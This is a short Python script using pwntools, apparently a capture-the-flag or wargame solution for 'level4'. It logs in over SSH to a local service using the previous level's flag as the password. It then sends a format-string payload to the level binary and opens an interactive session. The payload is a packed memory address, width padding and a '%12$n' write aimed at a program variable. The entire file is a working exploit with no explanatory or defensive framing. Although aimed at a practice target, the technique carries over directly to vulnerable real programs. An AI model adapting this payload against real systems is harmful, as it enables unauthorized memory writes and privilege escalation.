#!/usr/bin/env python

from pwn import *
import os

cwd = os.getcwd()
host = "127.0.0.1"
port = 4242

login = "level4"
binary = login
password = open(cwd + "/level3/flag", "r").read().splitlines()[0]
remotebinary = "/home/user/%s/%s" % (login, binary)

target_login = "level5"

shell = ssh(host=host, port=port, user=login, password=password)

m_var_address = p32(0x08049810)
padding = '%16930112d'
payload = m_var_address + padding + '%12$n'

print("# Sending")
p = shell.process([remotebinary], env={})
p.sendline(payload)

p.interactive()
